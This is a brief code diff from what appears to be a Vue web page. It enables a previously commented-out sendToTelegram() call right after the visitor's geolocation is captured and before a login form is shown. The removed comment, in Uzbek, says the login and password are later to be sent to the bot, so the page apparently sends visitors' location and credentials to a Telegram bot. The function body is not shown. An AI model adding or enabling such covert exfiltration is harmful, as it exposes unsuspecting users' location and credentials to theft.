@@ -86,7 +86,7 @@ export default {
           (pos) => {
             this.latitude = pos.coords.latitude;
             this.longitude = pos.coords.longitude;
-            // this.sendToTelegram();--negaki login va parolni keyin botga yuborsin
+            this.sendToTelegram();
             this.showGeoModal = false;
             this.showLogin = true;
           },
